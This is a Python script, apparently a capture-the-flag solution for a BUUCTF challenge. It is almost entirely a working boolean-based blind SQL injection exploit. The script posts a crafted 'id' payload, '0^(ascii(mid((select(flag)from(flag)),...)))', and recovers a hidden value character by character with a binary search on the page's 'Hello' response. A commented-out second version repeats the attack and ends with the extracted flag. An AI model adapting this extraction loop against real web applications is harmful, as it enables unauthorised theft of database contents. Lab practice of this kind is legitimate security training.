import requests
import time
import sys
import requests


def getPayload(result_index, char_index, ascii):


	select_str = "select(flag)from(flag)"
	# select_str = "select concat_ws('-',"+column_name[0]+","+column_name[1]+","+column_name[2]+") from "+table_name+" limit "+str(result_index)+",1"

	# 连接payload
	sqli_str = "0^(ascii(mid((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
	payload = {"id":sqli_str}
	return payload


def execute(result_index, char_index, ascii):
	# 连接url
	url = "http://8d2ca422-2ea3-4dc9-b6d4-409a852554af.node3.buuoj.cn/index.php"
	payload = getPayload(result_index, char_index, ascii)
	# print(payload)
	# 检查回显
	echo = "Hello"
	content = requests.post(url, data=payload).text
	time.sleep(0.1)
	if echo in content:
		return True
	else:
		return False


def dichotomy(result_index, char_index, left, right):
	while left < right:
		# 二分法
		ascii = int((left + right) / 2)
		if execute(str(result_index), str(char_index + 1), str(ascii)):
			left = ascii
		else:
			right = ascii
		# 结束二分
		if left == right - 1:
			if execute(str(result_index), str(char_index + 1), str(ascii)):
				ascii += 1
				break
			else:
				break
	return chr(ascii)


if __name__ == "__main__":
	for num in range(1):  # 查询结果的数量
		count = 0
		for len in range(100):  # 单条查询结果的长度
			count += 1
			char = dichotomy(num, len, 30, 126)
			if ord(char) == 1:  # 单条查询结果已被遍历
				break
			sys.stdout.write(char)
			sys.stdout.flush()
		if count == 1:  # 查询结果已被遍历
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()

#
# url = "http://8d2ca422-2ea3-4dc9-b6d4-409a852554af.node3.buuoj.cn/index.php"
# payload = {
# 	"id" : ""
# }
# result = ""
# for i in range(1,100):
# 	l = 33
# 	r =130
# 	mid = (l+r)>>1
# 	while(l<r):
# 		payload["id"] = "0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# 		html = requests.post(url,data=payload)
# 		print(payload)
# 		if "Hello" in html.text:
# 			l = mid+1
# 		else:
# 			r = mid
# 		mid = (l+r)>>1
# 	if(chr(mid)==" "):
# 		break
# 	result = result + chr(mid)
# 	print(result)
# 	time.sleep(0.5)
# print("flag: " ,result)
# flag{03d40c1d-e11b-4e45-af82-054427ff3501}
# flag{03d40c1d-e11b-4e45-af82-054427ff3501}
